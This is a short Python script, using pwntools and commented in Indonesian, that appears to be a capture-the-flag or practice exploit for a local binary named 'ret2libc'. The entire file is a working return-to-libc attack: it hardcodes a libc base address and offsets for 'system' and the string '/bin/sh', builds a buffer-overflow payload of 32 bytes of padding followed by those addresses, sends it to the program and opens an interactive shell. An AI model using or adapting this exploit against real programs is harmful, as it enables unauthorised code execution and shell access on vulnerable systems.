from pwn import *

#memulai proses
p = process('./ret2libc') 

# Base address libc (udah tau dari leak atau hasil debugging)
libc_base = 0xf7d67000  

# Hitung alamat fungsi "system" di libc
system = libc_base + 0x00524c0  

# Hitung alamat string "/bin/sh" di libc
binsh = libc_base + 0x1c9e3c  

# Bikin payload:
# - Isi buffer sampai ret (32 byte padding)
# - Tambahin alamat fungsi `system`
# - Tambahin dummy return address (nggak dipake, isi aja 0x0)
# - Terakhir, tambahin alamat "/bin/sh"
payload = b'a' * 32 + p32(system) + p32(0x0) + p32(binsh)

# Print payload biar bisa dicek
print(f'Payload = {payload}')

# Kirim payload ke program
p.sendline(payload)

# Masuk mode interaktif, biar bisa akses shell
p.interactive()
